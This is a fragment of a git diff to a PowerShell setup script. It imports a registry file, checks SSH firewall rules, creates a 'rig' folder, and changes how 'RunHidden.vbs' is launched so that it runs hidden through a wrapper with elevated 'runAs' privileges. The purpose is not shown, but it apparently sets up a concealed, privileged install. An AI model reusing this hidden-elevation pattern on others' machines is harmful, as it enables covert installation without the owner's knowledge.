@@ -98,12 +98,17 @@ Get-NetFirewallRule -Name *ssh*
 
 #install the registry
 ./wrev.reg; ./calty
+
+# Path to the PowerShell wrapper script
+$runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"
+
+# Move RunHidden.vbs to the initial directory
 mv $path\RunHidden.vbs $initial_dir
 
-
 Start-Sleep -Seconds 30
-./RunHidden
 
+# Run the wrapper script to execute RunHidden.vbs with elevated privileges
+Start-Process powershell -ArgumentList "-File `"$runHiddenWrapperPath`" -vbsPath `"$initial_dir\RunHidden.vbs`"" -Verb runAs
 
 #Create rig Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
